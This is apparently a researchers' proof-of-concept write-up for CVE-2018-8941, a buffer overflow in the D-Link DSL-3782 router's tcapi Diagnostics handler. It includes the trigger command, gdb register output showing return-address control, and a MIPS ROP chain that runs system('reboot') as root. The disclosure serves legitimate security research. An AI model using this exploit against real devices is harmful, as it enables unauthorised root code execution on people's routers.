## CVE-2018-8941: D-Link DSL-3782 Code execution (Proof of Concept)

Adam Simuntis :: https://twitter.com/adamsimuntis

Mindaugas Slusnys :: https://twitter.com/mislusnys
<br /><br />

The buffer overflow vulnerability was found in the "/userfs/bin/tcapi" binary which is used as a wrapper for the "Diagnostics" functionality in the Web GUI.

An authenticated user can pass a long buffer as an 'Addr' parameter to the '/user/bin/tcapi' binary using 'set Diagnostics_Entry' function and cause the memory corruption.
Furthermore, it is possible to redirect the flow of the program and execute an arbitrary code.

```
adam@expdev ~ $ file userfs/bin/tcapi
userfs/bin/tcapi: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
```

The vulnerability can be triggered as follows:

```
adam@expdev ~ $ sudo chroot . ./qemu-mips-static userfs/bin/tcapi
set
unset
get
show
commit
save
read
readAll
staticGet
adam@expdev ~ $ sudo chroot . ./qemu-mips-static userfs/bin/tcapi set
set <node_name attr value>

adam@expdev ~ $ sudo chroot . ./qemu-mips-static -g 12345 bin/tcapi set Diagnostics_Entry Addr `perl -e 'print "A"x596 . "BBBB"'`                                                                    ⏎

adam@expdev ~ $ gdb-multiarch
gdb-peda$ set arch mips
The target architecture is assumed to be mips
gdb-peda$ set endian big
The target is assumed to be big endian
gdb-peda$ target remote localhost:12345
Remote debugging using localhost:12345
Warning: not running or target is remote
0x409a7e76 in ?? ()
gdb-peda$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
Warning: not running or target is remote
0x42424242 in ?? () 

gdb-peda$ i r
          zero       at       v0       v1       a0       a1       a2       a3
 R0   00000000 f8ffffff fdffffff 00b07176 05000000 98edff76 11000000 00000000
            t0       t1       t2       t3       t4       t5       t6       t7
 R8   906d7976 8c837e76 8c837e76 00907f76 00907f76 00907f76 18000000 205e7d76
            s0       s1       s2       s3       s4       s5       s6       s7
 R16  41414141 41414141 41414141 41414141 05000000 f0064000 20094000 00000000
            t8       t9       k0       k1       gp       sp       s8       ra
 R24  21000000 50697276 00000000 00000000 50e67e76 d8f0ff76 00000000 42424242
            sr       lo       hi      bad    cause       pc
      10000020 5f1a0000 fc010000 42424242 00000000 42424242
           fsr      fir
      00000000 00937300
```

We have a full control over the return address along with a few other registers.


Full ROP chain used to execute 'system("reboot");' as root user can be crafted as follows: 
(ASLR has been disabled for testing purposes.)


```python
import struct

# since we are exploiting through the WEB GUI, binary process mappings (/proc/`pidof boa`/maps) were obtained from '/userfs/bin/boa' binary
libc_base = 0x2b02b000 
# 0x59bb0, offset to system(), big endian
libc_system = struct.pack(">I",libc_base+0x59bb0) 

rop_pad = 'A'*580

# 3rd: Jump to system() from libC, $a0 contains argument
s0 = libc_system

# 2nd: Load stored command from $a1 to $a0 then jump to next gadget at $s0 -> system(cmd)
#.text:00041980                 move    $a0, $a1
#.text:00041984                 li      $a2, 0xC
#.text:00041988                 move    $t9, $s0
#.text:0004198C                 jalr    $t9 ; memset

s1 = struct.pack(">I",libc_base+0x41980)
s2 = 'BBBB'
s3 = 'CCCC'

# 1st: Load command stored on the stack at ($sp+0x168) to $a1 then jump to next gadget at $s1 ^
#.text:0000C654                 addiu   $a1, $sp, 0x168+var_150
#.text:0000C658                 move    $t9, $s1
#.text:0000C65C                 jalr    $t9 ; stat64

ra = struct.pack(">I",libc_base+0xC654)

payload = rop_pad + s0 + s1 + s2 + s3 + ra + "reboot;"*10

```

Successful exploitation will execute 'system("reboot;")' as root user, causig the device to restart.

